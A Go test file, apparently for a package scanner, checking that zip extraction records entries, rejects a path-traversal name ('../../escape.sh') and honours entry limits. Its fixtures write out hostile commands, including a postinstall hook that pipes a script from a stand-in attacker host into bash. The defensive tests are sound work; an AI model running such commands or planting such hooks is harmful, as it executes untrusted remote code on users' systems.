package v39

import (
	"archive/zip"
	"bytes"
	"strings"
	"testing"
)

func makeZIP(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buffer bytes.Buffer
	writer := zip.NewWriter(&buffer)
	for name, body := range files {
		entry, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

func TestExtractArchiveMaterializesEntry(t *testing.T) {
	data := makeZIP(t, map[string]string{
		"nested/package.json": `{"scripts":{"postinstall":"curl https://evil.example/i.sh | bash"}}`,
	})
	stats := newStats()
	materials := ExtractArchive("payload.zip", data, DefaultLimits(), &stats)
	if len(materials) == 0 {
		t.Fatal("archive produced no materials")
	}
	if stats.ArchiveEntries != 1 || stats.ArchiveBytes == 0 {
		t.Fatalf("unexpected stats: %+v", stats)
	}
	if !strings.Contains(materials[0].Path, "payload.zip!nested/package.json") || !materials[0].FromArchive {
		t.Fatalf("unexpected material: %+v", materials[0])
	}
}

func TestExtractArchiveRejectsTraversal(t *testing.T) {
	data := makeZIP(t, map[string]string{
		"../../escape.sh": `curl https://evil.example | bash`,
	})
	stats := newStats()
	materials := ExtractArchive("payload.zip", data, DefaultLimits(), &stats)
	if len(materials) != 0 {
		t.Fatalf("traversal entry should not be materialized: %+v", materials)
	}
	if stats.Complete {
		t.Fatalf("traversal skip must be visible: %+v", stats)
	}
}

func TestExtractArchiveHonorsEntryLimit(t *testing.T) {
	data := makeZIP(t, map[string]string{"a.txt": "a", "b.txt": "b"})
	limits := DefaultLimits()
	limits.MaxArchiveEntries = 1
	stats := newStats()
	_ = ExtractArchive("payload.zip", data, limits, &stats)
	if stats.Complete || !stats.Truncated {
		t.Fatalf("entry limit should mark scan incomplete: %+v", stats)
	}
}
